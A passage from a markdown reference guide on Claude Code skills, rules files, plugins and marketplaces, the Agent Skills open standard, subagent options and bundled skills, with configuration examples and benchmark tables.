**Step 2:** Review with user via HTML template
**Step 3:** Run optimization:
1. Split: **60% train / 40% held-out test** (stratified by `should_trigger`)
2. Run each query **3 times** for reliable trigger rates
3. Claude with **extended thinking** (`budget_tokens: 10000`) proposes improved description
4. Re-evaluate on both train and test
5. Iterate up to **5 times** (or until all train queries pass)
6. Select best by **test score** (not train) to avoid overfitting
7. History **blinded** — test scores removed from improvement prompt

**Result:** Improved triggering on **5 out of 6** public skills in Anthropic testing.

### 48.9 SkillsBench Independent Validation

Independent study: 84 tasks, 11 domains, **7,308 total agent runs**.

| Finding | Value |
|---------|-------|
| Average improvement from curated skills | **+16.2 percentage points** |
| Best domain (healthcare) | +51.9pp |
| Worst domain (software engineering) | +4.5pp |
| 2-3 focused skills per task | +20.0pp |
| 4+ skills (diminishing returns) | +5.2pp |
| Compact skills | +18.9pp |
| Comprehensive doc skills | +5.7pp (3.3x worse than compact) |
| AI self-generated skills | **-1.3pp** (slightly negative) |
| Opus 4.6 self-generated | +1.4pp (only positive model) |
| GPT-5.2 self-generated | -5.6pp (degradation) |

**Key takeaways:**
- Keep skills compact — brevity beats comprehensiveness by ~4x
- 2-3 focused skills outperform skill sprawl
- Human-authored skills dramatically outperform AI-generated
- Skills teaching existing model capabilities provide minimal benefit

### 48.10 Platform Differences

| Feature | Claude Code | Claude.ai | Cowork |
|---------|-------------|-----------|--------|
| Subagent spawning | Yes (parallel) | No (sequential) | Yes (parallel) |
| Baseline runs | Yes | No | Yes |
| HTML viewer | Server (port 3117) | Inline results | Static mode |
| Feedback | POST to local server | In-conversation | Download JSON |

### 48.11 Skill Writing Guide (from SKILL.md)

- **Description strategy:** Be "pushy" — use active directives like "Make sure to use this skill whenever..."
- **Principle of Lack of Surprise:** Skills should produce expected outputs with no hidden side effects
- **Progressive loading:** Metadata ~100 words always loaded → Body <500 lines on match → Resources unlimited on reference
- **Name constraints:** kebab-case, no consecutive hyphens, max 64 chars
- **Description constraints:** no angle brackets, max 1024 chars

---

## 49. `.claude/rules/` Directory

Rules are the third context pillar alongside CLAUDE.md and skills. Unlike CLAUDE.md (single file, always loaded), rules are individual `.md` files that can be **path-targeted** using glob patterns.

### Location & Structure

```
.claude/rules/
├── always-use-types.md       # Loaded for all files
├── react-patterns.md         # Loaded only for React files (via glob)
└── api-conventions.md        # Loaded only for API files (via glob)
```

### Glob Targeting

Rules can specify which files they apply to via frontmatter:

```yaml
---
globs: "src/components/**/*.tsx"
---
When writing React components, always use functional components with hooks.
```

Multiple globs: `globs: ["*.ts", "*.tsx"]`

### Priority Behavior

When both CLAUDE.md and rules exist:
- CLAUDE.md loads first (always)
- Rules load after, in alphabetical order by filename
- Rules with matching globs only load when relevant files are in context
- Rules **override** CLAUDE.md for matching files (last-loaded wins)

### Rules vs CLAUDE.md vs Skills

| Feature | CLAUDE.md | Rules | Skills |
|---------|-----------|-------|--------|
| Always loaded | Yes | Only if glob matches (or no glob) | Description only |
| Path-targeted | No | Yes (globs) | No |
| User-invocable | No | No | Yes (`/name`) |
| Auto-triggered | Always | On file match | On intent match |
| Token cost | Full file always | Per-matching-rule | Progressive disclosure |

### Known Issues

| Issue | Description |
|-------|-------------|
| Rules loaded from `node_modules` | Nested discovery can pick up rules from dependencies |
| No glob validation | Invalid globs silently fail (no error, no loading) |
| Hot-reload inconsistent | Rules added mid-session may not load until restart |
| No priority field | Can't control load order beyond filename alphabetical |
| Glob syntax differs from gitignore | Uses minimatch, not gitignore patterns — `**/*.ts` works but `!pattern` doesn't |

---

## 50. Plugin System Architecture

Plugins are the distribution mechanism for skills, agents, hooks, and MCP servers as a bundle.

### Plugin Structure

```
my-plugin/
├── plugin.json            # Manifest (required)
├── CLAUDE.md              # Plugin-scoped instructions
├── skills/
│   └── my-skill/SKILL.md  # Plugin skills (namespaced)
├── agents/
│   └── my-agent.md        # Plugin agents
├── hooks/
│   └── hooks.json         # Plugin hooks
├── servers/
│   └── config.json        # MCP server configs
└── scripts/
    └── setup.sh           # Post-install script
```

### plugin.json Schema

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "description": "What this plugin does",
  "author": "team-name",
  "skills": ["skills/my-skill"],
  "agents": ["agents/my-agent.md"],
  "hooks": "hooks/hooks.json",
  "servers": ["servers/config.json"],
  "setup": "scripts/setup.sh",
  "settings": { "default_model": "sonnet" }
}
```

### Namespacing

Plugin skills use `plugin-name:skill-name` namespace. This prevents conflicts with project or personal skills. Example: `skill-creator:skill-creator` for the Anthropic skill-creator plugin.

### Installation Scopes

| Method | Scope | Command |
|--------|-------|---------|
| Claude.ai plugin page | User-level | One-click install |
| CLI | Project-level | `claude plugins add <url>` |
| Managed settings | Org-wide | Admin deployment |

### Key Variables

- `${CLAUDE_PLUGIN_ROOT}` — resolves to plugin's install directory
- Plugin hooks can reference scripts relative to plugin root
- Plugin settings.json provides defaults that user settings can override

### Marketplace Distribution

Plugins are distributed via **plugin marketplaces** — catalogs defined by `marketplace.json` files. Full docs: [Plugin Marketplaces](https://code.claude.com/docs/en/plugin-marketplaces)

**Official Anthropic marketplace:** `/plugin marketplace add anthropics/skills`

**CLI commands:**
```bash
/plugin marketplace add <owner/repo>      # Add a marketplace
/plugin marketplace update                 # Refresh all marketplaces
/plugin install <plugin>@<marketplace>     # Install from marketplace
/plugin validate .                         # Validate marketplace JSON
```

**Plugin sources supported:** relative paths, GitHub repos, git URLs, git subdirectories (sparse clone), npm packages, pip packages.

**Enterprise control:** `strictKnownMarketplaces` in managed settings restricts which marketplaces users can add (allowlist with exact match, `hostPattern` regex, or `pathPattern` regex).

**Caching:** Installed plugins are copied to `~/.claude/plugins/cache`. Plugins can't reference files outside their directory — use symlinks for shared resources.

---

## 51. Agent Skills Open Standard (agentskills.io)

The Agent Skills specification is an open standard for cross-platform skill portability.

### Compatible Products (32+)

Skills following the standard work across: Claude Code, Claude.ai, Claude API, Claude Agent SDK, Cursor, VS Code (Copilot), Windsurf, Cline, Gemini CLI, OpenAI Codex CLI, Amazon Q Developer, GitHub Copilot Workspace, JetBrains AI, Snowflake Cortex Code, and 18+ others.

### Specification Fields

The standard defines a minimal set of frontmatter fields:

```yaml
---
name: skill-name           # Required by standard
description: What and when # Required by standard
compatibility: Tool requirements  # Optional
license: MIT               # Optional
metadata:                  # Optional extensible object
  author: name
  version: 1.0.0
  tags: [deployment, aws]
---
```

### Claude Code Extensions Beyond Standard

Claude Code adds these fields that are NOT part of the open standard:
- `disable-model-invocation` — Claude Code specific
- `user-invocable` — Claude Code specific
- `context: fork` — Claude Code specific
- `agent` — Claude Code specific
- `allowed-tools` — Claude Code specific
- `model` — Claude Code specific
- `hooks` — Claude Code specific
- `argument-hint` — Claude Code specific

Other tools ignore these fields, making skills forward-compatible.

---

## 52. Subagent Advanced Features

Subagents have capabilities beyond basic `context: fork` that interact with skills.

### Memory Persistence

```yaml
# In agent definition (.claude/agents/my-agent.md)
---
memory: project    # Options: user, project, local
---
```

- `user` — persists across all projects (user-level memory)
- `project` — persists within current project only
- `local` — persists only in local (gitignored) context

### Background Execution

```yaml
---
background: true
---
```

Background agents run without blocking the main conversation. Results are returned asynchronously.

### Worktree Isolation

```yaml
---
isolation: worktree
---
```

Creates a temporary git worktree for the agent — isolated copy of the repo. Changes are on a separate branch. Worktree auto-cleans if agent makes no changes.

### Skill Preloading in Subagents

```yaml
---
skills:
  - deploy
  - review-pr
  - api-conventions
---
```

When skills are listed in an agent definition, their **full content** (not just descriptions) is injected at startup. This is different from normal skill loading where only descriptions are in context until triggered.

### CLI JSON Flag

Agents can be spawned programmatically:
```bash
claude --agents '[{"name":"worker","skills":["deploy"],"model":"sonnet"}]'
```

---

## 53. Bundled Skills Complete Reference

### `/simplify`

**Architecture:** Spawns 3 review agents in parallel:
1. **Code reuse agent** — finds duplicate logic, suggests DRY refactors
2. **Code quality agent** — style, naming, complexity, best practices
3. **Efficiency agent** — performance, memory, unnecessary operations

Results are aggregated and fixes applied. Optional focus: `/simplify focus on memory efficiency`

**Scope:** Reviews recently changed files (uses git diff to find modifications).

### `/batch <instruction>`

**Architecture:**
1. Researches codebase to understand scope
2. Decomposes work into 5-30 independent units
3. Presents plan for user approval
4. Spawns one agent per unit in isolated **git worktrees**
5. Each agent implements, tests, and opens a PR

**Requirements:** Must be in a git repository. Example: `/batch migrate src/ from Solid to React`

### `/debug [description]`

Troubleshoots current Claude Code session by reading the **session debug log**. Not the app's code — it debugs Claude Code itself. Optionally describe the issue to focus analysis.

### `/claude-api`

Loads Claude API reference material for your project's detected language (Python, TypeScript, Java, Go, Ruby, C#, PHP, cURL) plus Agent SDK reference for Python/TypeScript. Covers: tool use, streaming, batches, structured outputs, common pitfalls.

**Auto-triggers** when code imports `anthropic`, `@anthropic-ai/sdk`, or `claude_agent_sdk`.

---

## 54. Extended Thinking via `ultrathink`

Including the word "ultrathink" anywhere in skill content enables Claude's extended thinking mode for that skill invocation. This triggers a longer internal reasoning chain before responding.

**Mechanism:** The word is detected as a signal during skill content processing. It doesn't need to be in any specific location — frontmatter, instructions, or even comments.

**Cost implications:** Extended thinking uses significantly more tokens (budget_tokens up to 10,000+). Use judiciously for skills that benefit from deeper reasoning (complex analysis, multi-step planning, nuanced decisions).

**Practical pattern:**
```markdown
---
name: architecture-review
description: Deep architecture review with extended reasoning
---

<!-- ultrathink -->

Review the architecture of the specified system:
1. Identify all components and their relationships
2. Analyze coupling and cohesion
3. Find potential failure modes
4. Suggest improvements with tradeoffs
```
